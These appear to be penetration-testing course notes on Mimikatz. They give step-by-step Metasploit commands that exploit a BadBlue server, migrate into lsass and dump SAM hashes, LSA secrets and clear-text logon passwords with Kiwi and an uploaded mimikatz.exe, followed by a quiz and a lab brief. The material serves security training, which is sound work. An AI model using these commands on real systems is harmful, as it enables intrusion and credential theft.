
#### Mimikatz

- Post exploitation tool for extraction of credentials
- Security Account Manager


Setup msfconsole
```
service postgresql start && msfconsole
workspace -a mimikatz
setg RHOST <target_ip>
setg LHOST <loca_ip>
setg RHOSTs <target_ip>
```

Scan and enumerate target
```
db_nmap -sV <target_ip>
```

Setup module for exploitation
```
search badblue
use exploit/windows/http/badblue_passthru
options
set target <bad_blue_version>
exploit
```

Migrate to x64 process
```
pgrep lsass
migrate <lsass_id>
```

Load kiwi and dump creds 
```
load kiwi
creds_all -> dump all creds
lsa_dump_sam
lsa_dump_secrets
```

Upload mimikatz program to remote host
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Check privileges with mimikatz
```
mimikatz.exe
privilege::debug
```

Dump logon passwords in clear text
```
sekurlsa::logonpasswords
```
## Quiz 

Which one of the following meterpreter Kiwi commands can be used to dump the contents of the SAM database?

lsa_dump_sam
## Lab

A Kali GUI machine and a target machine running vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the machine using the appropriate Metasploit module. Then, use the meterpreter Kiwi plugin to extract sensitive data from the target's machine.

Objective: Exploit the application and find all the flags.

- Find Administrator and Student users NTLM hash.
- Dump LSA secrets to find Syskey

Instructions:* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. * The IP address of the target machine is mentioned in the file “/root/Desktop/target” * Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1


```

```